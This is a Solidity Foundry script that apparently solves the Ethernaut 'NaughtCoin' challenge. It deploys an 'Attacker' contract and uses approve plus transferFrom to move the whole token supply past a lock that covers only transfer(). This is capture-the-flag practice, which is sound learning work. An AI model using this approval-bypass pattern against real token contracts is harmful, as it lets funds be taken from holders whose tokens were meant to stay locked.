// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract Attacker {
    NaughtCoin coin;

    constructor(NaughtCoin code) payable {
        coin = code;
    }

    function attack(address from) external {
        coin.transferFrom(from, address(this), coin.INITIAL_SUPPLY());
    }
}

contract NaughtCoinScript is Script {
    NaughtCoin public code = NaughtCoin(0x20BE4EA844B34c7020d68CF8B0dcb4Af1300e4b1);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        Attacker hacker = new Attacker(code);
        code.approve(address(hacker), code.INITIAL_SUPPLY());
        hacker.attack(vm.envAddress("ACC"));
        vm.stopBroadcast();
    }
}
